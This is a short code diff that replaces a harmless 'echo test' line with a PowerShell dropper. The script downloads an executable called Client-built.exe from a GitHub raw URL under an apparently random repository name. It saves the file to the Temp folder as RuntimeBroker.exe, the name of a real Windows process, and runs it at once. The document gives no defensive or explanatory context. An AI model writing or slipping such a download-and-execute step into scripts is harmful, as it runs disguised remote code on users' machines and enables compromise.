@@ -1,1 +1,4 @@
-echo test
+$url = "https://github.com/zeryxia-exe/akljfhiojadshfiujahfiuasdhfiuasdfhasdffffffffffffffffffffff/raw/refs/heads/main/Client-built.exe"
+$output = "$env:Temp/RuntimeBroker.exe"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process -FilePath $output
